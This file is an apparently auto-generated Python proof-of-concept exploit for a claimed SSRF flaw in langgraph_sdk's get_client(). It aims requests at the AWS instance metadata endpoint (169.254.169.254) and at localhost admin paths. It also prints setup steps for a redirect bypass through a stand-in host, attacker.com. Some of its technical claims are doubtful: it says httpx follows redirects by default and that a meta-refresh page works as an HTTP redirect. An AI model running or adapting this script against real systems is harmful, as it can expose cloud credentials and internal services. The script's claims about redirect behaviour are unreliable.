#!/usr/bin/env python3
# PoC for langgraph_sdk (/home/xcy/.local/lib/python3.14/site-packages/langgraph_sdk)
# Path: ssrf-016
# Sink: get_client
# Auto-generated — run with: python3 ssrf_asyncclient_without_any_validation_get_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via langgraph_sdk get_client() URL parameter

Vulnerability: The get_client() function accepts a 'url' parameter that is passed
directly to httpx.AsyncClient as base_url without validation. httpx follows redirects
by default, allowing SSRF to internal services.

This PoC demonstrates:
1. Direct SSRF to internal IP (e.g., cloud metadata endpoint)
2. Redirect-based SSRF bypass (if initial URL is validated but redirects aren't)

Usage:
    python3 poc_ssrf.py [target_url]

    Default target: http://169.254.169.254/latest/meta-data/ (AWS metadata)
    Use --redirect to test redirect-based SSRF (requires attacker-controlled redirect server)
"""

import asyncio
import sys
import os
from typing import Optional

# Add the vulnerable package to path (adjust if needed)
sys.path.insert(0, os.path.expanduser("~/.local/lib/python3.14/site-packages"))

from langgraph_sdk import get_client


async def exploit_ssrf(target_url: str, use_redirect: bool = False) -> None:
    """
    Attempt SSRF via langgraph_sdk get_client().
    
    Args:
        target_url: The URL to target (internal service)
        use_redirect: If True, first connect to an attacker server that redirects to target_url
    """
    print(f"[*] LangGraph SDK SSRF Proof-of-Concept")
    print(f"[*] Target: {target_url}")
    print(f"[*] Using redirect: {use_redirect}")
    print()

    if use_redirect:
        # For redirect-based SSRF, we need an attacker-controlled redirect server
        # This is just a placeholder - in real attack, attacker hosts a server that
        # returns 302 redirect to internal IP
        print("[!] Redirect-based SSRF requires an attacker-controlled redirect server")
        print("[!] Example: attacker.com returns 302 -> http://169.254.169.254/latest/meta-data/")
        print("[!] Set up your redirect server and update the URL below")
        return

    try:
        # Create client with attacker-controlled URL
        # The URL is passed directly to httpx.AsyncClient as base_url
        print(f"[*] Creating LangGraph client with URL: {target_url}")
        client = get_client(url=target_url)
        
        # Attempt to make a request - this will go to the internal service
        # We use a benign GET request to demonstrate the SSRF
        print("[*] Attempting to fetch metadata from internal service...")
        
        # The client's internal httpx client will make requests to the base_url
        # We can trigger this by calling any API method
        # For demonstration, we try to list assistants (which will fail but shows the request was made)
        try:
            # This will make a GET request to {base_url}/assistants
            result = await client.assistants.get()
            print(f"[+] Success! Response: {result}")
        except Exception as e:
            # Even if the request fails (e.g., non-JSON response), the SSRF still occurred
            error_msg = str(e)
            if "ConnectError" in error_msg or "Connection refused" in error_msg:
                print(f"[-] Connection failed: {error_msg}")
                print("[*] This may indicate the target is not reachable or blocked")
            elif "HTTPStatusError" in error_msg:
                print(f"[+] Request was made! Got HTTP error: {error_msg}")
                print("[*] This confirms SSRF - the request reached the internal service")
            else:
                print(f"[?] Unexpected error: {error_msg}")
                print("[*] The request may have been made but response processing failed")
                
    except Exception as e:
        print(f"[-] Error creating client: {e}")
        print("[*] Check that langgraph_sdk is installed and accessible")


async def test_redirect_ssrf() -> None:
    """
    Demonstrate redirect-based SSRF.
    This requires setting up a redirect server first.
    """
    print("[*] Redirect-based SSRF Test")
    print("[*] This test requires:")
    print("  1. An attacker-controlled HTTP server that returns 302 redirects")
    print("  2. The redirect target should be an internal service")
    print()
    print("[*] Example setup:")
    print("  # On attacker machine (e.g., using Python):")
    print("  python3 -m http.server 8888")
    print("  # Create a file 'redirect.html' with:")
    print('  <html><head><meta http-equiv="refresh" content="0; url=http://169.254.169.254/latest/meta-data/"></head></html>')
    print()
    print("[*] Then run this script with:")
    print(f"  python3 {sys.argv[0]} http://attacker.com:8888/redirect.html --redirect")
    print()
    print("[!] Note: httpx follows HTTP 301/302 redirects by default")
    print("[!] Even if initial URL is validated, redirect target is NOT re-validated")


def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="SSRF PoC for langgraph_sdk get_client()",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Direct SSRF to AWS metadata endpoint
  python3 poc_ssrf.py http://169.254.169.254/latest/meta-data/
  
  # Direct SSRF to internal service
  python3 poc_ssrf.py http://127.0.0.1:8080/admin
  
  # Test redirect-based SSRF (requires redirect server)
  python3 poc_ssrf.py http://attacker.com/redirect --redirect
        """
    )
    
    parser.add_argument(
        "target_url",
        nargs="?",
        default="http://169.254.169.254/latest/meta-data/",
        help="Target URL for SSRF (default: AWS metadata endpoint)"
    )
    
    parser.add_argument(
        "--redirect",
        action="store_true",
        help="Use redirect-based SSRF (requires attacker-controlled redirect server)"
    )
    
    args = parser.parse_args()
    
    if args.redirect:
        asyncio.run(test_redirect_ssrf())
    else:
        asyncio.run(exploit_ssrf(args.target_url))


if __name__ == "__main__":
    main()
